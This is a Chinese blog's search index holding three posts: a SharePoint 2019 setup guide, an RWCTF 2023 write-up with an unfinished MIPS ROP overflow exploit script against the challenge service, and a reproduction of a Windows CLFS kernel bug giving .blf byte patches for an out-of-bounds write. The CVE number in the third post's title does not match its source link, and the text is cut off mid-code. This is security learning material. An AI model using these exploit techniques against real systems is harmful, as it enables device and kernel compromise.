<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>SharePoint 环境搭建</title>
    <link href="/2023/03/21/SharePoint%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2023/03/21/SharePoint%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="总流程"><a href="#总流程" class="headerlink" title="总流程"></a>总流程</h2><ol><li>安装 Windows Server 2019 </li><li>修改服务器名字</li><li>设置新林，域</li><li>安装 Windows Sql Server</li><li>安装 SharePoint Server 2019</li><li>配置 SharePoint Server 2019</li><li>添加新用户</li><li>新建网站集，并给网站集添加管理员用户</li></ol><h2 id="安装-Windows-Server-2019"><a href="#安装-Windows-Server-2019" class="headerlink" title="安装 Windows Server 2019"></a>安装 Windows Server 2019</h2><p>没什么好说的，就直接下载<code>Windows Server 2019</code>的镜像，安装就行了（我也不清楚<code>Standard</code>、<code>Datacenter</code>、<code>Essentials</code>的区别，我反正安装的是<code>Standard</code>）</p><p>注意选择带桌面模式的，否则应该没图形化界面</p><h2 id="修改服务器名字"><a href="#修改服务器名字" class="headerlink" title="修改服务器名字"></a>修改服务器名字</h2><p><img src="/img/SharePoint-Setup/SP2019.png" alt="SP2019"></p><p>修改计算机名字，便于局域网访问该服务器</p><h2 id="设置新林，域"><a href="#设置新林，域" class="headerlink" title="设置新林，域"></a>设置新林，域</h2><h3 id="添加角色和功能"><a href="#添加角色和功能" class="headerlink" title="添加角色和功能"></a>添加角色和功能</h3><p>点击仪表盘-添加角色和功能、安装类型（选默认，基于角色或基于功能的安装）、服务器选择（选默认，从服务器池中选择服务器，选择本机）、服务器角色（勾选<code>Active Directory 域服务</code>）、功能（勾选<code>.NET Framework 3.5 功能</code>）、<code>AD DS</code>（点下一步）、确认（点安装）</p><p><img src="/img/SharePoint-Setup/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%92%E8%89%B2.png" alt="服务器角色"></p><p><img src="/img/SharePoint-Setup/%E5%8A%9F%E8%83%BD.png" alt="功能"></p><h3 id="提升为域控制器"><a href="#提升为域控制器" class="headerlink" title="提升为域控制器"></a>提升为域控制器</h3><p>将此服务器提升为域控制器</p><p><img src="/img/SharePoint-Setup/%E6%8F%90%E5%8D%87%E4%B8%BA%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8.png" alt="提升为域控制器"></p><ul><li>部署配置（添加新林，设置根域名）</li></ul><p><img src="/img/SharePoint-Setup/%E9%83%A8%E7%BD%B2%E9%85%8D%E7%BD%AE.png" alt="部署配置"></p><ul><li>域控制器选项（默认，<code>Windows Server 2016</code>，设置密码；DNS 选项，默认，不用勾选，直接下一步）</li></ul><p><img src="/img/SharePoint-Setup/DNS%E9%80%89%E9%A1%B9.png" alt="DNS选项"></p><ul><li>其他选项（设置<code>NetBIOS</code>域名）</li></ul><p><img src="/img/SharePoint-Setup/%E5%85%B6%E4%BB%96%E9%80%89%E9%A1%B9.png" alt="其他选项"></p><p>路径、查看选项、先决条件检查、安装、结果</p><p>安装完毕就会重启</p><h2 id="安装-Windows-Sql-Server"><a href="#安装-Windows-Sql-Server" class="headerlink" title="安装 Windows Sql Server"></a>安装 Windows Sql Server</h2><p>我是安装了一个<code>SQLServer2016SP2-FullSlipstream-x64-CHS.iso</code>的<code>Windows Sql</code>（也没激活），直接双击<code>iso</code>进行安装</p><p>在<code>安装</code>中选择<code>全新 SQL Server 独立安装或向现有安装添加功能</code>进行安装</p><ul><li>功能选择：需要勾选，因为我只用搭建<code>SharePoint</code>环境，因此我只勾选了数据库引擎服务</li></ul><p><img src="/img/SharePoint-Setup/%E5%8A%9F%E8%83%BD%E9%80%89%E6%8B%A9.png" alt="功能选择"></p><ul><li>数据库引擎配置：需要添加当前用户</li></ul><p><img src="/img/SharePoint-Setup/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BC%95%E6%93%8E%E9%85%8D%E7%BD%AE.png" alt="数据库引擎配置"></p><p><code>SQL Server 2016</code>安装成功</p><p><img src="/img/SharePoint-Setup/SQL-Server-2016.png" alt="SQL-Server-2016"></p><h2 id="安装-SharePoint-Server-2019"><a href="#安装-SharePoint-Server-2019" class="headerlink" title="安装 SharePoint Server 2019"></a>安装 SharePoint Server 2019</h2><p>下载镜像，双击<code>iso</code>，通过<code>splash.hta</code>进行安装</p><p><img src="/img/SharePoint-Setup/splash-hta.png" alt="splash.hta"></p><p>先<code>安装必备软件</code>（安装之前，需要将<code>Windows Server</code>更新到最新版），再<code>安装 SharePoint Server</code></p><p>这个过程很简单，运行即可</p><h2 id="配置-SharePoint-Server-2019"><a href="#配置-SharePoint-Server-2019" class="headerlink" title="配置 SharePoint Server 2019"></a>配置 SharePoint Server 2019</h2><ul><li><p>连接到服务器场（选择<code>创建新的服务器场</code>）</p></li><li><p>指定配置数据库设置时（<strong>注意</strong>这里就算是数据库服务器和当前服务器在一个机器上，也要写具体的<code>ip</code>，而不是<code>127.0.0.1</code>）</p></li></ul><p><img src="/img/SharePoint-Setup/%E6%8C%87%E5%AE%9A%E9%85%8D%E7%BD%AE%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E7%BD%AE.png" alt="指定配置数据库设置"></p><ul><li><p>指定服务器角色（我个人配置选择的是<code>自定义</code>，也要看到别人选择<code>单一服务器场</code>，具体区别不懂）</p></li><li><p>SharePoint产品配置向导</p></li></ul><p><img src="/img/SharePoint-Setup/SharePoint%E4%BA%A7%E5%93%81%E9%85%8D%E7%BD%AE%E5%90%91%E5%AF%BC.png" alt="SharePoint产品配置向导"></p><p>等配置结束即可</p><h2 id="添加新用户"><a href="#添加新用户" class="headerlink" title="添加新用户"></a>添加新用户</h2><p>服务器管理器-仪表盘-工具-<code>Active Directory用户和计算机</code></p><p>我个人配置，是对于创建一个组织单位，在组织单位中创建用户，当然可以直接创建用户</p><p><img src="/img/SharePoint-Setup/%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7.png" alt="添加用户"></p><p><strong>注意</strong>这里用户登录名是 <code>liubei@sp.com.cn</code> ，之后登录时需要带<code>@sp.com.cn</code></p><p><img src="/img/SharePoint-Setup/%E6%96%B0%E5%BB%BA%E7%94%A8%E6%88%B7.png" alt="新建用户"></p><p><strong>注意</strong>这里设置密码时，把默认的用户下次登陆时须更改密码去掉，否则得再登录一次机器，才能登录到其有权限查看或管理的网站集（这里卡了我好久，当时死活登录不上去）</p><p><img src="/img/SharePoint-Setup/%E7%94%A8%E6%88%B7%E8%AE%BE%E7%BD%AE%E5%AF%86%E7%A0%81.png" alt="用户设置密码"></p><h2 id="新建网站集"><a href="#新建网站集" class="headerlink" title="新建网站集"></a>新建网站集</h2><p>之前准备工作全部做完之后，可以通过打开<code>SharePoint 2019管理中心</code>进行管理</p><p><img src="/img/SharePoint-Setup/SP2019-4321.png" alt="SP2019:4321"></p><p>先通过<code>管理Web应用程序</code>新建一个Web应用程序，直接用默认的即可</p><p><img src="/img/SharePoint-Setup/web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%AE%A1%E7%90%86.png" alt="web应用程序管理"></p><p>再创建网站集，我这里选择的是项目网站，其他的并未尝试过，下面设置其主管理员和第二管理员</p><p><img src="/img/SharePoint-Setup/%E5%88%9B%E5%BB%BA%E7%BD%91%E7%AB%99%E9%9B%86.png" alt="创建网站集"></p><p>使用管理员刘备进行登录（<strong>注意</strong>首先不能选择用户初次登录就要修改密码，且登录时用户名需要带<code>@sp.com.cn</code>，这个林的名字）</p><p><img src="/img/SharePoint-Setup/JiHan-LiuBei.png" alt="JiHan-LiuBei"></p><p>登录效果如图</p><p><img src="/img/SharePoint-Setup/%E5%AD%A3%E6%B1%89.png" alt="季汉"></p><p>网站集可以共享给其他用户，且可以设置其他用户的权限</p><p>这个网站集在局域网内均可访问</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://www.cnblogs.com/jianyus/p/9874010.html">https://www.cnblogs.com/jianyus/p/9874010.html</a><br><a href="https://www.jianshu.com/p/fb96bfcd3770">https://www.jianshu.com/p/fb96bfcd3770</a><br><a href="https://blog.51cto.com/u_13737725/3178938">https://blog.51cto.com/u_13737725/3178938</a><br><a href="https://blog.51cto.com/u_13737725/3178944">https://blog.51cto.com/u_13737725/3178944</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>setup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SharePoint</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RWCTF 2023 ShellFind</title>
    <link href="/2023/02/08/RWCTF%202023%20ShellFind/"/>
    <url>/2023/02/08/RWCTF%202023%20ShellFind/</url>
    
    <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这题主要当时搭建环境用了很多时间，导致最后没时间写<code>exp</code>，在此记录一下环境搭建的过程</p><p>主要环境搭建还是有三种办法：<code>qemu-system</code>起<code>mips system</code>环境；<code>qemu-user</code>起单个二进制文件；<code>firmadyne</code>起<code>mips system</code>环境</p><h3 id="qemu-system"><a href="#qemu-system" class="headerlink" title="qemu-system"></a>qemu-system</h3><p>从<a href="https://people.debian.org/~aurel32/qemu/mips/">aurel32 mips</a>中下载对应的<code>qemu</code>镜像</p><p>在起系统之前需要建立<code>qemu</code>系统和宿主机之间的网络桥接</p><p>依次运行以下指令</p><ol><li><code>sudo apt-get install bridge-utils uml-utilities</code></li><li><code>sudo gedit /etc/network/interfaces</code></li></ol><pre><code class="hljs properties"><span class="hljs-attr">auto</span> <span class="hljs-string">lo</span><span class="hljs-attr">iface</span> <span class="hljs-string">lo inet loopback</span><span class="hljs-attr">auto</span> <span class="hljs-string">ens33</span><span class="hljs-attr">iface</span> <span class="hljs-string">ens33 inet dhcp</span><span class="hljs-comment">#auto br0</span><span class="hljs-attr">iface</span> <span class="hljs-string">br0 inet dhcp</span>  <span class="hljs-attr">bridge_ports</span> <span class="hljs-string">ens33</span>  <span class="hljs-attr">bridge_maxwait</span> <span class="hljs-string">0</span></code></pre><ol start="3"><li><code>sudo gedit /etc/qemu-ifup</code> （最后添加几行）</li></ol><pre><code class="hljs routeros"><span class="hljs-comment">#! /bin/sh</span><span class="hljs-comment"># Script to bring a network (tap) device for qemu up.</span><span class="hljs-comment"># The idea is to add the tap device to the same bridge</span><span class="hljs-comment"># as we have default routing to.</span><span class="hljs-comment"># in order to be able to find brctl</span><span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$PATH</span>:/sbin:/usr/sbin<span class="hljs-attribute">ip</span>=$(which ip)<span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$ip</span>&quot;</span> ]; then  <span class="hljs-built_in"> ip </span>link <span class="hljs-builtin-name">set</span> <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> up<span class="hljs-keyword">else</span>   <span class="hljs-attribute">brctl</span>=$(which brctl)   <span class="hljs-keyword">if</span> [ ! <span class="hljs-string">&quot;<span class="hljs-variable">$ip</span>&quot;</span> -o ! <span class="hljs-string">&quot;<span class="hljs-variable">$brctl</span>&quot;</span> ]; then     echo <span class="hljs-string">&quot;W: <span class="hljs-variable">$0</span>: not doing any bridge processing: neither ip nor brctl utility not found&quot;</span> &gt;&amp;2     exit 0   fi   ifconfig <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> 0.0.0.0 upfi<span class="hljs-attribute">switch</span>=$(ip<span class="hljs-built_in"> route </span>ls | \    awk <span class="hljs-string">&#x27;/^default / &#123;</span><span class="hljs-string">          for(i=0;i&lt;NF;i++) &#123; if ($i == &quot;dev&quot;) &#123; print $(i+1); next; &#125; &#125;</span><span class="hljs-string">         &#125;&#x27;</span>        )<span class="hljs-comment"># only add the interface to default-route bridge if we</span><span class="hljs-comment"># have such interface (with default route) and if that</span><span class="hljs-comment"># interface is actually a bridge.</span><span class="hljs-comment"># It is possible to have several default routes too</span><span class="hljs-keyword">for</span> br <span class="hljs-keyword">in</span> <span class="hljs-variable">$switch</span>; <span class="hljs-keyword">do</span>    <span class="hljs-keyword">if</span> [ -d /sys/class/net/<span class="hljs-variable">$br</span>/bridge/. ]; then        <span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$ip</span>&quot;</span> ]; then         <span class="hljs-built_in"> ip </span>link <span class="hljs-builtin-name">set</span> <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> master <span class="hljs-string">&quot;<span class="hljs-variable">$br</span>&quot;</span>        <span class="hljs-keyword">else</span>          brctl addif <span class="hljs-variable">$br</span> <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span>        fi        exit# exit with status of the previous command    fidoneecho <span class="hljs-string">&quot;W: <span class="hljs-variable">$0</span>: no bridge for guest interface found&quot;</span> &gt;&amp;2<span class="hljs-comment">################################################################</span><span class="hljs-comment">#!/bin/sh</span>sudo /sbin/ifconfig <span class="hljs-variable">$1</span> 0.0.0.0 promisc upsudo /sbin/brctl addif br0 <span class="hljs-variable">$1</span>sleep 3</code></pre><ol start="4"><li><code>sudo chmod a+x /etc/qemu-ifup</code></li><li><code>sudo service network-manager restart</code> 重启服务</li><li><code>sudo ifconfig ens33 down</code> 关闭<code>ens33</code></li><li><code>sudo ifup br0</code> 起<code>br0</code>桥接，看到类似如下内容即成功了<pre><code class="hljs angelscript">Internet Systems Consortium DHCP Client <span class="hljs-number">4.4</span><span class="hljs-number">.1</span>Copyright <span class="hljs-number">2004</span><span class="hljs-number">-2018</span> Internet Systems Consortium.All rights reserved.For info, please visit https:<span class="hljs-comment">//www.isc.org/software/dhcp/</span>Listening on LPF/br0/<span class="hljs-number">00</span>:<span class="hljs-number">0</span>c:<span class="hljs-number">29</span>:ae:<span class="hljs-number">1</span>b:<span class="hljs-number">28</span>Sending on   LPF/br0/<span class="hljs-number">00</span>:<span class="hljs-number">0</span>c:<span class="hljs-number">29</span>:ae:<span class="hljs-number">1</span>b:<span class="hljs-number">28</span>Sending on   Socket/fallbackCreated duid <span class="hljs-string">&quot;\000\001\000\001+J\377\&quot;\000\014)\256\033(&quot;</span>.DHCPDISCOVER on br0 to <span class="hljs-number">255.255</span><span class="hljs-number">.255</span><span class="hljs-number">.255</span> port <span class="hljs-number">67</span> <span class="hljs-built_in">int</span>erval <span class="hljs-number">3</span> (xid=<span class="hljs-number">0xcab4930e</span>)DHCPOFFER of <span class="hljs-number">192.168</span><span class="hljs-number">.152</span><span class="hljs-number">.132</span> <span class="hljs-keyword">from</span> <span class="hljs-number">192.168</span><span class="hljs-number">.152</span><span class="hljs-number">.254</span>DHCPREQUEST <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span><span class="hljs-number">.152</span><span class="hljs-number">.132</span> on br0 to <span class="hljs-number">255.255</span><span class="hljs-number">.255</span><span class="hljs-number">.255</span> port <span class="hljs-number">67</span> (xid=<span class="hljs-number">0xe93b4ca</span>)DHCPACK of <span class="hljs-number">192.168</span><span class="hljs-number">.152</span><span class="hljs-number">.132</span> <span class="hljs-keyword">from</span> <span class="hljs-number">192.168</span><span class="hljs-number">.152</span><span class="hljs-number">.254</span> (xid=<span class="hljs-number">0xcab4930e</span>)bound to <span class="hljs-number">192.168</span><span class="hljs-number">.152</span><span class="hljs-number">.132</span> -- renewal <span class="hljs-keyword">in</span> <span class="hljs-number">853</span> seconds.</code></pre></li></ol><p>通过<code>ifconfig</code>看<code>ip</code></p><p>通过如下命令，起<code>qemu system</code></p><pre><code class="hljs shell">sudo qemu-system-mips -M malta \    -kernel vmlinux-2.6.32-5-4kc-malta \    -hda debian_squeeze_mips_standard.qcow2 \    -append &quot;root=/dev/sda1 console=tty0&quot; \    -net nic \    -net tap \    -nographic</code></pre><p>通过如下指令进行，切换系统</p><pre><code class="hljs awk">scp -r .<span class="hljs-regexp">/squashfs-root/</span> root@<span class="hljs-number">192.168</span>.<span class="hljs-number">152.133</span>:<span class="hljs-regexp">/root/</span>chroot <span class="hljs-regexp">/root/</span>squashfs-root sh</code></pre><h3 id="qemu-user"><a href="#qemu-user" class="headerlink" title="qemu-user"></a>qemu-user</h3><p>当找到核心关键的二进制文件之后，通过如下指令进行调试</p><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> qemu-mips -g <span class="hljs-number">12345</span> -L . ./usr/sbin/ipfind eth<span class="hljs-number">0</span></code></pre><p><code>gdbscript</code>如下</p><pre><code class="hljs awk"><span class="hljs-comment"># set architecture mips</span><span class="hljs-comment"># set endian big</span>file <span class="hljs-regexp">/mnt/</span>d<span class="hljs-regexp">/Desktop/</span>ctf<span class="hljs-regexp">/rwctf2023/</span>firmware<span class="hljs-regexp">/_firmware.bin.extracted/</span>squashfs-root<span class="hljs-regexp">/usr/</span>sbin/ipfindset sysroot <span class="hljs-regexp">/mnt/</span>d<span class="hljs-regexp">/Desktop/</span>ctf<span class="hljs-regexp">/rwctf2023/</span>firmware<span class="hljs-regexp">/_firmware.bin.extracted/</span>squashfs-roottarget remote:<span class="hljs-number">12345</span>tb *<span class="hljs-number">0</span>x401088tb *<span class="hljs-number">0</span>x401078</code></pre><h3 id="firmadyne"><a href="#firmadyne" class="headerlink" title="firmadyne"></a>firmadyne</h3><p>可以直接通过<code>AttifyOS</code>中的<code>firmadyne</code>直接运行</p><p>最好的是，该系统可以直接运行固件系统自启时的一些服务，从而直接看到什么服务是自启的，而不用自己去找</p><p>当然也可以自己查看<code>/etc/rc.d/rcS.d/</code></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>写<code>exp</code>的时候，实话说，很久没写过<code>mips rop</code>就基本不怎么会写了，一开始完全没注意到是<code>NX disabled</code>的，然后对于库函数的使用，最开始的时候没恢复<code>$gp</code>，后面再写的时候基本就时间不够了</p><p>一个未写完的<code>exp</code></p><pre><code class="hljs routeros">import socketimport sys<span class="hljs-keyword">from</span> pwn import *import base64TARGET_IP = <span class="hljs-string">&quot;172.25.67.200&quot;</span>TARGET_PORT = 62720bufferSize          = 1024serverAddressPort   = (TARGET_IP, TARGET_PORT)context.log_level = <span class="hljs-string">&quot;debug&quot;</span>io = remote(TARGET_IP, TARGET_PORT, <span class="hljs-attribute">typ</span>=<span class="hljs-string">&quot;udp&quot;</span>)def leakMacAddress():    # leak    msgFromClient = b<span class="hljs-string">&#x27;FIVI&#x27;</span>    msgFromClient += b<span class="hljs-string">&#x27;1234&#x27;</span>    # mac    # 52 54 00 12 34 56    #msgFromClient += b<span class="hljs-string">&#x27;\x52\x54\x00\x12\x34\x56&#x27;</span>    msgFromClient += p8(10)    msgFromClient += p8(1) # magic <span class="hljs-keyword">to</span> bypass 1 check at 0x402684    msgFromClient += p8(0) # bypass at 0x40268C    msgFromClient += p8(4)    msgFromClient += b<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*0</span>x4    msgFromClient += b<span class="hljs-string">&#x27;8&#x27;</span>    msgFromClient += b<span class="hljs-string">&#x27;\xff&#x27;</span><span class="hljs-number">*6</span> # maybe fake mac address    msgFromClient += p16(0) # v8    msgFromClient += p32(0) # v17    msgFromClient += b<span class="hljs-string">&#x27;x&#x27;</span><span class="hljs-number">*0</span>x20    io.sendline(msgFromClient)def pwn():    # 0x00400e40: addiu <span class="hljs-variable">$sp</span>, <span class="hljs-variable">$sp</span>, 0x20; lw <span class="hljs-variable">$ra</span>, 0x1c(<span class="hljs-variable">$sp</span>); jr <span class="hljs-variable">$ra</span>; addiu <span class="hljs-variable">$sp</span>, <span class="hljs-variable">$sp</span>, 0x20;    # .text:004020B0  move <span class="hljs-variable">$a0</span>, <span class="hljs-variable">$s0</span>;    # .text:00400F3C    # 0x00400d70: lw <span class="hljs-variable">$t9</span>, (<span class="hljs-variable">$s0</span>); addiu <span class="hljs-variable">$s1</span>, <span class="hljs-variable">$s1</span>, 1; move <span class="hljs-variable">$a2</span>, <span class="hljs-variable">$s5</span>; move <span class="hljs-variable">$a1</span>, <span class="hljs-variable">$s4</span>; jalr <span class="hljs-variable">$t9</span>; move <span class="hljs-variable">$a0</span>, <span class="hljs-variable">$s3</span>;    # .text:00401220    # 0x00400c9c : lw <span class="hljs-variable">$gp</span>, 0x10(<span class="hljs-variable">$sp</span>) ; lw <span class="hljs-variable">$ra</span>, 0x1c(<span class="hljs-variable">$sp</span>) ; jr <span class="hljs-variable">$ra</span> ; addiu <span class="hljs-variable">$sp</span>, <span class="hljs-variable">$sp</span>, 0x20    # 00402ac0 : lw <span class="hljs-variable">$gp</span>, 0x10(<span class="hljs-variable">$sp</span>) ; lw <span class="hljs-variable">$ra</span>, 0x1c(<span class="hljs-variable">$sp</span>) ; jr <span class="hljs-variable">$ra</span> ; addiu <span class="hljs-variable">$sp</span>, <span class="hljs-variable">$sp</span>, 0x20    # 0x41b030    gp = b<span class="hljs-string">&quot;\x00\x41\xb0\x30&quot;</span>    # lw <span class="hljs-variable">$gp</span>, 0x10(<span class="hljs-variable">$sp</span>) ; lw <span class="hljs-variable">$ra</span>, 0x1c(<span class="hljs-variable">$sp</span>) ; jr <span class="hljs-variable">$ra</span> ; addiu <span class="hljs-variable">$sp</span>, <span class="hljs-variable">$sp</span>, 0x20    gadget1 = b<span class="hljs-string">&quot;\x00\x40\x2A\xC0&quot;</span>    # call sendto    gadget2 = b<span class="hljs-string">&quot;\x00\x40\x1D\x7C&quot;</span>    # addiu <span class="hljs-variable">$sp</span>, <span class="hljs-variable">$sp</span>, 0x20; lw <span class="hljs-variable">$ra</span>, 0x1c(<span class="hljs-variable">$sp</span>); jr <span class="hljs-variable">$ra</span>; addiu <span class="hljs-variable">$sp</span>, <span class="hljs-variable">$sp</span>, 0x20;    gadget3 = b<span class="hljs-string">&quot;\x00\x40\x0e\x40&quot;</span>    payload = b<span class="hljs-string">&quot;A&quot;</span><span class="hljs-number">*0</span>x240+b<span class="hljs-string">&quot;B&quot;</span><span class="hljs-number">*0</span>x4+b<span class="hljs-string">&quot;C&quot;</span><span class="hljs-number">*0</span>x4+b<span class="hljs-string">&quot;D&quot;</span><span class="hljs-number">*0</span>x4    # 0x402ac0: <span class="hljs-builtin-name">set</span> gp    payload += gadget1    payload += b<span class="hljs-string">&quot;X&quot;</span><span class="hljs-number">*0</span>x10    # <span class="hljs-variable">$gp</span>: 0x41b030    payload += gp    payload += b<span class="hljs-string">&quot;X&quot;</span><span class="hljs-number">*0</span>x8    payload += gadget3    payload += b<span class="hljs-string">&quot;X&quot;</span><span class="hljs-number">*0</span>x20    payload += b<span class="hljs-string">&quot;X&quot;</span><span class="hljs-number">*0</span>x1c    payload += gadget3    payload += b<span class="hljs-string">&quot;X&quot;</span><span class="hljs-number">*0</span>x4    payload += b<span class="hljs-string">&quot;X&quot;</span><span class="hljs-number">*0</span>x20    payload += b<span class="hljs-string">&quot;X&quot;</span><span class="hljs-number">*0</span>x1c    payload += gadget2    msgFromClient = b<span class="hljs-string">&#x27;FIVI&#x27;</span>    msgFromClient += b<span class="hljs-string">&#x27;1234&#x27;</span>    # mac    # 52 54 00 12 34 56    #msgFromClient += b<span class="hljs-string">&#x27;\x52\x54\x00\x12\x34\x56&#x27;</span>    msgFromClient += p8(10)    msgFromClient += p8(2) # magic <span class="hljs-keyword">to</span> bypass 1 check at 0x402684    msgFromClient += p8(0) # bypass at 0x40268C    msgFromClient += p8(4)    msgFromClient += b<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*0</span>x4    msgFromClient += b<span class="hljs-string">&#x27;8&#x27;</span>    # msgFromClient += b<span class="hljs-string">&#x27;\x52\x54\x00\x12\x34\x56&#x27;</span> # maybe fake mac address    msgFromClient += b<span class="hljs-string">&#x27;\x00\x15\x5d\xb3\x71\x6a&#x27;</span> # maybe fake mac address    msgFromClient += p16(0) # v8    msgFromClient += p32(0x8E) # v17    msgFromClient += b<span class="hljs-string">&#x27;x&#x27;</span><span class="hljs-number">*0</span>x40  # username    msgFromClient += base64.b64encode(payload)    io.sendline(msgFromClient)pwn()io.interactive()</code></pre><p>官方<a href="https://mp.weixin.qq.com/s/Wb7SMy8AHtiv71kroHEHsQ">exp</a></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>之前翻到另外一个镜像的仓库，但是这个仓库里的镜像不能起起来，可能是我用法没用对</p><blockquote><p><a href="https://people.debian.org/~jcowgill/qemu-mips/">https://people.debian.org/~jcowgill/qemu-mips/</a></p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://www.freebuf.com/vuls/228726.html">https://www.freebuf.com/vuls/228726.html</a><br><a href="https://people.debian.org/~aurel32/qemu/mips/">https://people.debian.org/~aurel32/qemu/mips/</a><br><a href="https://gist.github.com/extremecoders-re/3ddddce9416fc8b293198cd13891b68c">https://gist.github.com/extremecoders-re/3ddddce9416fc8b293198cd13891b68c</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mips</tag>
      
      <tag>firmware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-37696 漏洞复现</title>
    <link href="/2022/10/22/CVE-2022-37696%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/10/22/CVE-2022-37696%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><pre><code class="hljs angelscript">虚拟机：Win10 <span class="hljs-number">21</span>h2 <span class="hljs-number">19044.1889</span>物理机：Win10debugger：windbg previewcompiler：vs2022</code></pre><p>环境我使用的是<code>Win10 21h2</code>官方8月的版本</p><h2 id="简述漏洞"><a href="#简述漏洞" class="headerlink" title="简述漏洞"></a>简述漏洞</h2><p>在<code>blf</code>文件<code>Base Log Record</code>区域的<code>cbSymbolZone</code>字段的检测被绕过，从而导致畸形的<code>cbSymbolZone</code>（即越界的<code>cbSymbolZone</code>）可以被使用，从而可以在任意偏移位置进行越界写。</p><p>这个检测被绕过，跟<code>Base Log Record</code>区域头的<code>SignaturesOffset</code>字段相关，原本利用<code>SignaturesOffset</code>字段进行检测，但是存在另外一个漏洞，利用不正确的<code>SignaturesOffset</code>，可以进行任意地址写入<code>0xffff</code>，从而又覆盖<code>SignaturesOffset</code>高位的2个字节，从而可以使得大数<code>cbSymbolZone</code>可以绕过检测</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="POC-总览"><a href="#POC-总览" class="headerlink" title="POC 总览"></a>POC 总览</h3><p>可以通过<a href="https://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2022-37969-part">参考链接</a>的<code>POC.png</code>对该漏洞的利用进行大概了解</p><p><img src="/img/CVE-2022-37696/POC.png" alt="POC"></p><p>其核心主要在步骤3省略的部分，即对于初始化的<code>MyLog.blf</code>进行修改，然后再对于已经做了改动的<code>MyLog.blf</code>进行解析（P.S. 如果<code>v51</code>无法打开成功的话，其实就是已经被<code>patch</code>了），并且在此时，把这个文件设置成<code>GENERIC_READ | GENERIC_WRITE | DELETE</code></p><p>最后在<code>MyLog.blf</code>进行<code>AddLogContainer</code>会溢出覆盖到之前<code>MyLxg_xxx.blf</code>的<code>pContainer</code>指针上，从而导致<code>BSOD</code></p><h3 id="MyLog-blf-的修改"><a href="#MyLog-blf-的修改" class="headerlink" title="MyLog.blf 的修改"></a>MyLog.blf 的修改</h3><p>参考链接的对于<code>MyLog.blf</code>修改的归总如下（P.S. 下图中的0x86C是写错了的，应该是<code>0x868</code>）</p><p><img src="/img/CVE-2022-37696/010.png" alt="010"></p><p><img src="/img/CVE-2022-37696/diff.png" alt="diff"></p><p><strong>SignaturesOffset</strong></p><p><code>0x0868: |80 79 00 00| =&gt; |50 00 00 00|</code><br>这个修改不确定有没有用，最终<code>50 00 00 00</code>会被漏洞修改为<code>50 00 ff ff</code>从而实现绕过</p><p><strong>rgClients</strong></p><p><code>0x09a8: |68 13 00 00| =&gt; |30 1B 00 00|</code><br>相当于把一个<code>0x1386</code>的<code>Offset</code>修改为了<code>0x1B30</code>，相当于<code>0x1BD8=0x1386+0x870</code>的<code>Client Context</code>被弃用，在<code>0x23A0=0x1B30+0x870</code>的地方，重新伪造了一个<code>Client Context</code>结构体</p><p><strong>cbSymbolZone</strong></p><p><code>0x1B98: |F8 00 00 00| =&gt; |4B 11 01 00|        cbSymbolZone        0x1114B</code><br>改大<code>cbSymbolZone</code>，以使得<code>AddLogContainer</code>时，会造成堆越界写</p><p><strong>Client Context</strong></p><p><code>0x2390: |00 00 00 00 00 00 00 00| =&gt; |B8 1B 00 00 30 1B 00 00|</code><br>该字段的修改是为了伪造的<code>FakeClientContext</code>能过检测</p><p><img src="/img/CVE-2022-37696/FakeClientContext.png" alt="FakeClientContext"><br>在<code>CLFS_LOG_STATE eState</code>字段设置为了<code>CLFS_LOG_SHUTDOWN 0x20</code></p><h3 id="畸形-SignaturesOffset-的影响"><a href="#畸形-SignaturesOffset-的影响" class="headerlink" title="畸形 SignaturesOffset 的影响"></a>畸形 SignaturesOffset 的影响</h3><p>构造了一个畸形的<code>.blf</code>，然后再次打开时，会对于该<code>blf</code>进行解析</p><p><code>HANDLE v51 = CreateLogFile(L&quot;LOG:C:\\Users\\Public\\MyLog&quot;, GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_ALWAYS, 